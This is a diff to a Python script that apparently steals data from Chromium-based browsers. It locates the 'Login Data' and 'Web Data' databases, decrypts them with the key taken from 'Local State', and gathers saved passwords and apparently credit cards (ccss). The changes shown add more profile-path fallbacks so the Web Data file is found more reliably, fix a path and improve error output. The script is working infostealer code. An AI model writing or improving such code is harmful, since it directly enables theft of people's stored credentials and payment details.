@@ -360,10 +360,9 @@ if yes == "yes":
 							db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
 							if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
 								continue
-
 				print(db_path)
 				key = fetching_encryption_key()
-				
+
 				filename = "ChromePasswords.db"
 				shutil.copyfile(db_path, filename)
 				# connecting to the database
@@ -561,7 +560,7 @@ if yes == "yes":
 				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
 					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
 					if not os.path.isfile(local_state_path):
-						local_state_path = chromiumpaths[i] +"\\User Data\\"+"\\Default\\" + "\\Local State"
+						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
 						if not os.path.isfile(local_state_path):
 							continue
 						
@@ -569,6 +568,16 @@ if yes == "yes":
 				key = get_encryption_key(local_state_path)
 				# local sqlite Chrome database path
 				db_path = chromiumpaths[i] + "\\Web Data"
+				if not os.path.isfile(db_path):
+					db_path = chromiumpaths[i] + "\\User Data"+ "\\Web Data"
+					if not os.path.isfile(db_path):
+						db_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Web Data"
+						if not os.path.isfile(db_path):
+							db_path = chromiumpaths[i] +"\\User Data\\"+"Profile 1\\" + "\\Web Data"
+							if not os.path.isfile(db_path):
+								db_path = chromiumpaths[i] +"\\User Data\\"+"Profile 2\\" + "\\Web Data"
+								if not os.path.isfile(db_path):
+									continue
 				# copy the file to another location
 				# as the database will be locked if chrome is currently running
 				filename = "ChromeData.db"
@@ -599,8 +608,8 @@ if yes == "yes":
 				os.remove(filename)
 			except:
 				pass
-		except:
-			pass
+		except Exception as e:
+			print(e)
 		return ccss
 
 
